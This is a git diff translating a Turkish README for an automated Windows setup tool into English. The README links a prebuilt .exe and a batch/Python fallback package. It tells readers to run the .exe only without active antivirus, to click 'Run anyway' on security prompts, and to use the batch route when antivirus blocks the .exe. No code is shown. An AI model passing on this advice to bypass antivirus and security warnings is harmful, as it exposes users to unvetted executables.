@@ -1,74 +1,69 @@
-# TTGM Otomatik Kurulum #
+# TTGM Automatic Setup
 
-## 🛠️ Basit Kurulum Talimatları
+## 🛠️ Simple Installation Instructions
 
-Bu proje otomatik iso yüklemesi sonrasında kurulum için hazırlanmıştır. Aşağıda iki farklı kurulum yöntemi yer almaktadır:
-
----
-
-### 🔹 1. Kolay Yöntem (Tavsiye Edilen)
-
-Eğer bilgisayarınızda herhangi bir antivirüs aktif değilse, doğrudan aşağıdaki dosyayı indirip çalıştırabilirsiniz:
-
-👉 [TTAutoSetup.exe indir](https://github.com/7yasin/ttautosetup/releases/download/supportassist/TTAutoSetup.exe)
-
-> Bu dosya her şeyi sizin yerinize yapar. Kurulum sırasında çıkan güvenlik uyarılarını “Çalıştır” diyerek geçebilirsiniz.
+This project is prepared to run **after an automated ISO installation**. Below are two installation methods:
 
 ---
 
-### 🔹 2. Alternatif Yöntem (Antivirüs engel oluyorsa)
+### 🔹 1) Easy Method (Recommended)
 
-Bazı antivirüs programları otomatik kurulum aracını engelleyebilir. Bu durumda aşağıdaki `.zip` dosyasını indirip içindeki `kurulum.bat` dosyasını çalıştırmalısınız:
+If there is **no antivirus** actively running on your computer, simply download and run the file below:
 
-👉 [autoSetup.zip indir](https://github.com/7yasin/ttautosetup/releases/download/supportassist/autoSetup.zip)
+👉 [Download TTAutoSetup.exe](https://github.com/7yasin/ttautosetup/releases/download/supportassist/TTAutoSetup.exe)
 
-**İçindekiler:**
-- `kurulum.bat` → Python yükler ve kurulumu başlatır.
-- `main.py` → Asıl kurulum dosyasıdır (otomatik çalışır).
+> This executable handles everything for you. During installation, you may see security prompts — choose **“Run anyway”** to proceed.
 
 ---
 
-📌 **Not:** Kurulum dosyaları güvenlidir. Ancak bazı antivirüsler tarafından yanlışlıkla uyarı verilebilir.
+### 🔹 2) Alternative Method (If antivirus blocks the .exe)
 
+Some antivirus products may block the automatic installer. In that case, download the `.zip` below and run the `kurulum.bat` inside:
 
+👉 [Download autoSetup.zip](https://github.com/7yasin/ttautosetup/releases/download/supportassist/autoSetup.zip)
 
-
-
-
-
-## ⚙️ Geliştiriciler ve Teknik Kullanıcılar İçin
-
-Bu projede iki ayrı dağıtım yöntemi bulunmaktadır:
+**Contents:**
+- `kurulum.bat` → Installs Python if needed and starts the setup.
+- `main.py` → Main installer script (runs automatically).
 
 ---
 
-### 🔸 1. Tek Dosyalı Yürütülebilir (Standalone .exe)
-
-- Dosya: [`TTAutoSetup.exe`](https://github.com/7yasin/ttautosetup/releases/download/supportassist/TTAutoSetup.exe)
-- Amaç: Python kurulu olmayan sistemlerde dahi otomasyonun çalışmasını sağlamak.
-- Özellik: `main.py` scripti PyInstaller ile derlenmiş; kurulum ve yapılandırma işlemlerini doğrudan başlatır.
-
-**Not:** Çoğu antivirüs henüz bu .exe dosyasını tanımadığı için çalışmasına izin verir. Ancak bazı sistemlerde false positive uyarı verebilir.
+📌 **Note:** The installers are safe. However, some antivirus tools may incorrectly flag them (false positive).
 
 ---
 
-### 🔸 2. Kaynak Kod ve Batch Tabanlı Kurulum (Fallback Yöntemi)
+## ⚙️ For Developers and Technical Users
 
-- Paket: [`autoSetup.zip`](https://github.com/7yasin/ttautosetup/releases/download/supportassist/autoSetup.zip)
-- İçerik:
-  - `main.py`: Python betiği
-  - `kurulum.bat`: Python yükleyicisi ve script çalıştırıcısı
-- Özellik: Eğer .exe engellenirse bu alternatif yol ile Windows'ta otomatik Python kurulumu yapılır ve ardından `main.py` çalıştırılır.
+This project provides two distribution methods:
 
 ---
 
-### Ek Bilgi
+### 🔸 1) Single Executable (Standalone .exe)
 
-- `kurulum.bat`, Windows üzerinde Python olup olmadığını denetler.
-- Gerekirse Microsoft Store veya doğrudan installer üzerinden Python kurar.
-- Script sonrasında sistem yapılandırması için gerekli ayarları otomatik uygular.
+- File: [`TTAutoSetup.exe`](https://github.com/7yasin/ttautosetup/releases/download/supportassist/TTAutoSetup.exe)  
+- Purpose: Run the automation even on systems **without** a pre-installed Python.  
+- Detail: The `main.py` script is packaged with **PyInstaller** and launches configuration tasks directly.
+
+**Note:** Most antivirus tools do not yet recognize this .exe and allow it to run, but some systems may still show false positives.
 
 ---
 
-**Güvenlik Notu:** Kaynak dosyalar açık olarak sağlanmaktadır. Dilerseniz `main.py` içeriğini gözden geçirip kendi sisteminizde derleme yapabilirsiniz.
+### 🔸 2) Source + Batch-Based Installer (Fallback)
 
+- Package: [`autoSetup.zip`](https://github.com/7yasin/ttautosetup/releases/download/supportassist/autoSetup.zip)  
+- Includes:
+  - `main.py` – Python script
+  - `kurulum.bat` – Checks/installs Python and runs the script
+- Detail: If the .exe is blocked, this alternative installs Python on Windows (if missing) and then executes `main.py`.
+
+---
+
+### Additional Information
+
+- `kurulum.bat` checks whether Python is installed on Windows.  
+- If needed, it installs Python (via Microsoft Store or direct installer).  
+- Afterwards, the script applies the required system configuration automatically.
+
+---
+
+**Security Note:** The source files are openly provided. You can review `main.py` and build your own executable if desired.
